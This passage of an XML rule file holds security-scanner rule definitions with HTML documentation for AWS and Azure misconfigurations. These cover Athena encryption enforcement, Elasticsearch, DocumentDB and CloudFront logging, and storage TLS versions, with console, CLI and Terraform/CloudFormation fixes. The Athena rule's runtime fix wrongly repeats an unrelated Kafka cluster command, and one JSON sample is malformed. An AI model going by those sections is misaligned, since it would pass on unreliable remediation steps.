--encryption-info file://encryptioninfo.json
--kafka-version "2.2.1"
--number-of-broker-nodes 3
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_msk_cluster</li>
<li><strong>Arguments:</strong> encryption_info - (Optional) Configuration block for specifying encryption.<br/>
encryption_in_transit - (Optional) Configuration block to specify encryption in transit. See below.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_msk_cluster" "example" {
  cluster_name           = "example"
  ...
    + encryption_info {
  +    encryption_at_rest_kms_key_arn = aws_kms_key.kms.arn
  +   
    +    encryption_in_transit {
    +        client_broker = "TLS"
    +        in_cluster    = true 
  +     }
  + }
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_32' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_32</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_32' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_82</key>
    <name>Ensure Athena workgroup prevents disabling encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="athena-workgroup-does-not-prevent-disabling-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-athena-workgroup-does-not-prevent-disabling-encryption"></div>Athena workgroup does not prevent disabling encryption</div><a aria-label="Skip link to Athena workgroup does not prevent disabling encryption" class="heading-anchor-icon fa fa-anchor" href="#athena-workgroup-does-not-prevent-disabling-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>You can configure settings at the workgroup level, enforce control over the workgroup. This only affects you if you run queries in the workgroup; if you do, workgroup settings are used.</p>
<p>If a query runs in a workgroups and the workgroup overrides client-side settings, Athena uses the workgroup's settings for encryption. It also overrides any other settings specified for the query in the console, by using API operations, or with drivers.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Run the create-cluster command and use the encryption-info option to point to the file where you saved your configuration JSON. </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws kafka create-cluster
--cluster-name "ExampleClusterName"
--broker-node-group-info file://brokernodegroupinfo.json
--encryption-info file://encryptioninfo.json
--kafka-version "2.2.1"
--number-of-broker-nodes 3
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong>aws_athena_workgroup</li>
<li><strong>Argument:</strong> enforce_workgroup_configuration - (Optional) Boolean whether the settings for the workgroup override client-side settings. For more information, see Workgroup Settings Override Client-Side Settings. Defaults to true. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_athena_workgroup.example.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_athena_workgroup.example.tf">resource "aws_athena_workgroup" "example" {
  name = "example"
 ...
  configuration {
    enforce_workgroup_configuration    = true
    publish_cloudwatch_metrics_enabled = true

    result_configuration {
      output_location = "s3://{aws_s3_bucket.example.bucket}/output/"

      encryption_configuration {
        encryption_option = "SSE_KMS"
        kms_key_arn       = aws_kms_key.example.arn
      }
    }
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::Athena::WorkGroup</li>
<li><strong>Argument:</strong> Properties.WorkGroupConfiguration.EnforceWorkGroupConfiguration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  MyAthenaWorkGroup:
    Type: AWS::Athena::WorkGroup
    Properties:
      ...
+     WorkGroupConfiguration:
+       EnforceWorkGroupConfiguration: true
        ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_33' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_33</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_33' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_84</key>
    <name>Ensure AWS Elasticsearch domain logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-domain-logging-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticsearch-domain-logging-is-not-enabled"></div>AWS Elasticsearch domain logging is not enabled</div><a aria-label="Skip link to AWS Elasticsearch domain logging is not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-domain-logging-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon ES exposes logs through CloudWatch. ES logs supported include error logs, search slow logs, index slow logs, and audit logs. All the logs are disabled by default. ES logs enable troubleshooting performance and stability issues. Audit logs track user activity for compliance purposes. If enabled, standard CloudWatch pricing applies.</p>
<p>We recommend you enable elasticsearch domain logging. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>. </li>
<li>Open the <a href="https://console.aws.amazon.com/es/home" target="_self">Amazon Elasticsearch console</a>.</li>
<li>In the navigation pane, under <strong>My domains</strong>, select the domain that you want to update.<br/>
4.Navigate to the <strong>Logs</strong> tab. For the log that you are working with, select <strong>Enable</strong>.</li>
<li>Create a <strong>CloudWatch log group</strong>, or select an existing one.</li>
<li>Select an access policy that contains the appropriate permissions, or create a new policy. Select <strong>Enable</strong>.</li>
<li>The <strong>status</strong> of your domain changes from <strong>Active</strong> to <strong>Processing</strong>. Prior to log publishing being enabled, the status of your domain must return to <strong>Active</strong>. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Before you can enable log publishing, you need a CloudWatch log group. If you don't already have one, you will need to can create one.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws logs put-resource-policy --policy-name my-policy --policy-document &lt;policy_doc_json&gt;
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_elasticsearch_domain</li>
<li><strong>Argument</strong>: log_publishing_options - (Optional) Options for publishing slow and application logs to CloudWatch Logs. This block can be declared multiple times, for each log_type, within the same resource. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticsearch_domain" "example" {
  ...
  domain_name           = "example"
  log_publishing_options {
    cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn
    log_type                 = "INDEX_SLOW_LOGS"
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Elasticsearch::Domain</li>
<li><strong>Argument</strong>: Properties.LogPublishingOptions.AUDIT_LOGS.Enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Resource0:
    Type: 'AWS::Elasticsearch::Domain'
    Properties:
      ...
      LogPublishingOptions:
        AUDIT_LOGS:
+         Enabled: True
          ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/elasticsearch_7' target='_blank'> https://docs.bridgecrew.io/docs/elasticsearch_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/elasticsearch_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_85</key>
    <name>Ensure AWS DocumentDB logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-documentdb-logging-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-document-db-logging-is-not-enabled"></div>AWS DocumentDB logging is not enabled</div><a aria-label="Skip link to AWS DocumentDB logging is not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-documentdb-logging-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The events recorded by the AWS DocumentDB audit logs include: successful and failed authentication attempts, creating indexes or dropping a collection in a database within the DocumentDB cluster.</p>
<p>AWS CloudWatch logs are a service that monitors, stores and accesses your log files from a variety of sources within your AWS account. When logging is enabled information such as Data Definition Language, authentication, authorization, and user management events are sent to AWS CloudWatch logs. This information can be used to analyze, monitor and archive your Amazon DocumentDB auditing events for security and compliance requirements.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/docdb" target="_self">Amazon DocumentDB</a>.</li>
<li>In the navigation pane, choose <strong>Clusters</strong>.</li>
<li>Specify the cluster that you want to modify by choosing the button to the left of the cluster's name.</li>
<li>Choose <strong>Actions</strong>, then click <strong>Modify</strong>.</li>
<li>In the Modify Cluster: <!-- --> pane.</li>
<li>Go to<strong> Log Exports</strong> and enable exporting audit or profiler logs.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Use the modify-db-cluster operation to modify the specified cluster using the AWS CLI.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws docdb modify-db-cluster \
   --db-cluster-identifier sample-cluster \
   --cloudwatch-logs-export-configuration '{"EnableLogTypes":["audit"]}'
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_docdb_cluster</li>
<li><strong>Argument:</strong> enabled_cloudwatch_logs_exports - (Optional) List of log types to export to cloudwatch. If omitted, no logs will be exported. The following log types are supported: audit, profiler. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_docdb_cluster" "docdb" {
  cluster_identifier      = "my-docdb-cluster"
  ...
+ enabled_cloudwatch_logs_exports  = ["audit", "profiler"]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_19' target='_blank'> https://docs.bridgecrew.io/docs/logging_19</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_19' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_86</key>
    <name>Ensure AWS CloudFront distribution has access logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudfront-distribution-has-access-logging-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-front-distribution-has-access-logging-disabled"></div>AWS CloudFront distribution has access logging disabled</div><a aria-label="Skip link to AWS CloudFront distribution has access logging disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudfront-distribution-has-access-logging-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloudfront access logs contain detailed information (requested object name, date and time of the access, client IP, access point, error code, etc) about each request made for your web content. This information can be extremely useful during security audits, or as input data for various analytics/reporting tools. </p>
<p>Pairing with Lambda and WAF logs could help expedite a response process and possibly enable blocking requests coming from IP addresses that generate multiple errors. These spikes in errors could possibly indicate they were made by attackers trying to find vulnerabilities within your web application.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloud-front-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-front-console"></div>AWS Cloud Front Console</div><a aria-label="Skip link to AWS Cloud Front Console" class="heading-anchor-icon fa fa-anchor" href="#aws-cloud-front-console"></a></h2>
<p>Procedure:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/cloudfront/home" target="_self">AMazon CloudFront console</a>.</li>
<li>Select a <strong>CloudFront Distribution</strong> that is missing access logging.</li>
<li>From the menu, click <strong>Distribution Settings</strong>  to get into the configuration page.</li>
<li>From the <strong>General</strong> tab on the top menu, click <strong>Edit</strong>.  </li>
<li>In <strong>Distribution Settings</strong> tab scroll down and verify the <strong>Logging</strong> feature configuration status. If Logging is Off then it cannot create log files that contain detailed information about every user request that CloudFront receives.</li>
<li>Click <strong>ON</strong> to initiate the Logging feature of CloudFront to log all viewer requests for files in your distribution.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Create an S3 bucket to store your access logs. </li>
<li>Create a JSON file to enable logging and set an S3 bucket location to configure a destination for logs files.</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">logging</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="logging">{
      "ETag": "ETAGID001",
      "DistributionConfig": {
          ...
          "Logging": {
            "Bucket": "cloudfront-logging.s3.amazonaws.com",
            "Enabled": true,
          },
        }
      }
    }
</code></pre></div></div>
<ol start="3">
<li>Run update-distribution to update your distribution with your distribution id, the path of the configuration file, and your etag.</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws cloudfront update-distribution
        --id ID000000000000
        --distribution-config logging.json
        --if-match ETAGID001
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="buildtime-remediation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-buildtime-remediation"></div>Buildtime Remediation</div><a aria-label="Skip link to Buildtime Remediation" class="heading-anchor-icon fa fa-anchor" href="#buildtime-remediation"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudfront_distribution</li>
<li><strong>Argument:</strong> logging_config (Optional) - The logging configuration that controls how logs are written to your distribution (maximum one). </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudfront_distribution" "s3_distribution" {
  ...
  default_root_object = "index.html"
+ logging_config {
+   bucket          = "mylogs.s3.amazonaws.com"
    ...
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::CloudFront::Distribution</li>
<li><strong>Argument:</strong> Properties.DistributionConfig.Logging/Bucket</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  MyCloudFrontDistribution:
    Type: 'AWS::CloudFront::Distribution'
    Properties:
        ...
      DistributionConfig:
        ...
+       Logging:
+         Bucket: myawslogbucket.s3.amazonaws.com
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_20' target='_blank'> https://docs.bridgecrew.io/docs/logging_20</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_20' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_44</key>
    <name>Ensure storage account uses the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="storage-account-does-not-use-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-storage-account-does-not-use-the-latest-version-of-tls-encryption"></div>Storage account does not use the latest version of TLS encryption</div><a aria-label="Skip link to Storage account does not use the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#storage-account-does-not-use-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Communication between a client application and an Azure Storage account is encrypted using Transport Layer Security (TLS). TLS is a standard cryptographic protocol that ensures privacy and data integrity between clients and services over the Internet.</p>
<p>Azure Storage currently supports three versions of the TLS protocol: 1.0, 1.1, and 1.2. Azure Storage uses TLS 1.2 on public HTTPS endpoints, but TLS 1.0 and TLS 1.1 are still supported for backward compatibility.</p>
<p>To follow security best practices and the latest PCI compliance standards, Microsoft recommends enabling the latest version of TLS protocol (TLS 1.2) for all your Microsoft Azure App Service web applications. PCI DSS information security standard requires that all websites accepting credit card payments uses TLS 1.2 after June 30, 2018.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to your <strong>storage account</strong>.</li>
<li>Select <strong>Configuration</strong>.</li>
<li>Under <strong>Minimum TLS version</strong>, use the drop-down to select the minimum version of TLS required to access data in this storage account, as shown in the following image.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The minimumTlsVersion property is not set by default when you create a storage account with Azure CLI. This property does not return a value until you explicitly set it. The storage account permits requests sent with TLS version 1.0 or greater if the property value is null.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">az storage account create \
    --name &lt;storage-account&gt; \
    --resource-group &lt;resource-group&gt; \
    --kind StorageV2 \
    --location &lt;location&gt; \
    --min-tls-version TLS1_1

az storage account show \
    --name &lt;storage-account&gt; \
    --resource-group &lt;resource-group&gt; \
    --query minimumTlsVersion \
    --output tsv

az storage account update \
    --name &lt;storage-account&gt; \
    --resource-group &lt;resource-group&gt; \
    --min-tls-version TLS1_2

az storage account show \
    --name &lt;storage-account&gt; \
    --resource-group &lt;resource-group&gt; \
    --query minimumTlsVersion \
    --output tsv
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_storage_account</li>
<li><strong>Attribute:</strong> min_tls_version (Optional)<br/>
The minimum supported TLS version for the storage account. Possible values are TLS1_0, TLS1_1, and TLS1_2. Defaults to TLS1_0 for new storage accounts. Use TLS1_2.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account" "test" {
  ...
+  min_tls_version      = "TLS1_2"
  ...
}
</code></pre></div></div>
